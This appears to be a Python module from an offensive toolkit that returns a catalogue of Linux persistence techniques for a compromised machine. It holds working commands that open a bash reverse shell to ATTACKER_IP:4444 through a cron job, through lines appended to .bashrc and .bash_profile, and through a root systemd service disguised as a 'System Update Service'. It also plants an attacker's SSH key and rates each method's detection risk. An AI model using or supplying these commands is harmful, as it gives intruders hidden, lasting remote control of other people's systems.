"""Linux persistence methods"""

def get_linux_persistence_methods():
    """
    Get all Linux persistence methods
    Returns: Dict of persistence methods
    """
    methods = {
        'cron_job': {
            'description': 'Add reverse shell to cron',
            'commands': [
                '(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'") | crontab -'
            ],
            'detection_risk': 'Medium',
            'requires': 'User account access'
        },
        'bashrc': {
            'description': 'Add to user bash startup',
            'commands': [
                'echo \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\' >> ~/.bashrc',
                'echo \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\' >> ~/.bash_profile'
            ],
            'detection_risk': 'Low',
            'requires': 'Write access to home directory'
        },
        'ssh_keys': {
            'description': 'Add SSH authorized key',
            'commands': [
                'mkdir -p ~/.ssh',
                'chmod 700 ~/.ssh',
                'echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys',
                'chmod 600 ~/.ssh/authorized_keys'
            ],
            'detection_risk': 'Low',
            'requires': 'SSH service enabled'
        },
        'systemd_service': {
            'description': 'Create systemd service (requires root)',
            'commands': [
                'cat > /etc/systemd/system/update-service.service << EOF',
                '[Unit]',
                'Description=System Update Service',
                '[Service]',
                'Type=simple',
                'ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',
                'Restart=always',
                '[Install]',
                'WantedBy=multi-user.target',
                'EOF',
                'systemctl enable update-service',
                'systemctl start update-service'
            ],
            'detection_risk': 'High',
            'requires': 'Root access'
        }
    }
    
    return methods